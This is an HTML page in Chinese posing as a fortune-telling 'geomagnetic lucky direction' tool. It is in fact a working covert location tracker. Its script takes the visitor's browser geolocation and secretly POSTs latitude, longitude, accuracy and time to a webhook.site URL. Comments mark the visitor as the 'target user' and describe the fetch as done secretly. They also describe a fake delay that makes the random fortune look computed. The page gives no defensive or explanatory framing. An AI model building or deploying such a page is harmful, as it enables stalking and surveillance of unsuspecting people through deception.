<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>2024 地理磁场与天命能量测算</title>
    <style>
        body { background: linear-gradient(135deg, #2c3e50, #4ca1af); color: #fff; font-family: 'PingFang SC', 'Microsoft YaHei', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .container { text-align: center; background: rgba(255, 255, 255, 0.1); padding: 40px 20px; border-radius: 30px; backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.2); width: 85%; max-width: 400px; box-shadow: 0 20px 50px rgba(0,0,0,0.3); }
        h1 { font-size: 22px; margin-bottom: 20px; letter-spacing: 2px; color: #ffd700; }
        p { font-size: 15px; line-height: 1.6; color: #e0e0e0; margin-bottom: 30px; }
        .btn { background: linear-gradient(45deg, #ffd700, #ffa500); color: #333; padding: 15px 30px; border-radius: 50px; text-decoration: none; font-weight: bold; font-size: 17px; cursor: pointer; border: none; box-shadow: 0 5px 15px rgba(255,215,0,0.4); transition: 0.3s; }
        .btn:active { transform: scale(0.95); }
        #loading { display: none; margin-top: 20px; }
        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #ffd700; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #result { display: none; text-align: center; animation: fadeIn 1s ease-in; }
        .res-text { font-size: 18px; color: #ffd700; font-weight: bold; margin-bottom: 10px; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>

    <div id="main-ui">
        <div style="text-align: center;">
            <div style="font-size: 50px;">✨</div>
            <h2 style="margin-bottom: 10px;">地理能量分析仪</h2>
            <p style="font-size: 14px; opacity: 0.8; margin-bottom: 30px;">基于当前地理经纬度，计算今日专属幸运方位与磁场能量</p >
            <button id="start-btn" onclick="startAnalysis()" style="background: #ffd700; border: none; padding: 12px 30px; border-radius: 25px; font-weight: bold; cursor: pointer; font-size: 16px;">开始分析我的磁场</button>
        </div>
    </div>

    <div id="loading-ui" style="display: none; text-align: center;">
        <div class="spinner"></div>
        <div class="spinner" style="margin: 20px auto;"></div> 
        <!-- 这里的spinner用CSS定义了 -->
        <div class="spinner" id="spinner-div"></div>
        <p id="status-text" style="color: #fff; font-size: 15px;">正在校准经纬度...</p >
    </div>

    <div id="result">
        <div style="font-size: 50px;">🌙</div>
        <div class="res-text" id="res-dir">分析完成！</div>
        <p id="res-desc" style="font-size: 14px; color: #eee; line-height: 1.6;"></p >
        <p style="font-size: 12px; color: #aaa; margin-top: 20px;">(分析结果有效期：24小时)</p >
    </div>

    <script>
        // ==========================================
        // ⚠️ 重要：在这里填入你的 Webhook URL ⚠️
        const WEBHOOK_URL = 'https://webhook.site/54a45101-24ce-4b64-ba04-c1b48a5b5092';
        // ==========================================

        function startAnalysis() {
            document.getElementById('main-ui').style.display = 'none';
            document.getElementById('loading-ui').style.display = 'block';
            
            // 模拟加载过程
            const statuses = ["正在定位经纬度...", "正在检索全球能量图谱...", "计算磁场偏角...", "生成今日幸运方位..."];
            let i = 0;
            const interval = setInterval(() => {
                document.getElementById('status-text').innerText = statuses[i];
                i++;
                if (i >= statuses.length) clearInterval(interval);
            }, 1200);

            // 获取地理位置
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(success, error);
            } else {
                alert("您的浏览器不支持地理定位");
            }
        }

        function success(position) {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            const acc = position.coords.accuracy;

            // 发送数据到你的后台 (偷偷执行)
            fetch(WEBHOOK_URL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    user: "目标用户",
                    latitude: lat,
                    longitude: lon,
                    accuracy: acc,
                    time: new Date().toLocaleString()
                })
            });

            // 延迟一点点，让用户觉得在计算
            setTimeout(() => {
                showResult();
            }, 2000);
        }

        function error() {
            alert("定位失败，请确保已开启位置权限！");
            location.reload();
        }

        function showResult() {
            document.getElementById('loading-ui').style.display = 'none';
            document.getElementById('result').style.display = 'block';
            
            const directions = ["正东方", "西南方", "正北方", "东南方", "西北方"];
            const randomDir = directions[Math.floor(Math.random() * directions.length)];
            const descs = [
                "今日你的能量场与该方向高度同步，建议在此方向寻找灵感或机会。",
                "该方位目前存在强烈的正向磁场，适合进行重要的沟通或会议。",
                "磁场显示该方向有贵人运，如果去散步或办公，会有意外收获。",
                "能量分析显示该方向为你的‘财气聚集点’，留意该方向的机遇。",
                "该方位今日磁场最安静，适合冥想、休息或处理复杂问题。"
            ];
            const randomDesc = descs[Math.floor(Math.random() * descs.length)];

            document.getElementById('res-dir').innerText = "你的今日幸运方位： " + randomDir;
            document.getElementById('res-desc').innerText = randomDesc;
        }
    </script>
    <style>
        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #ffd700; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</body>
</html>
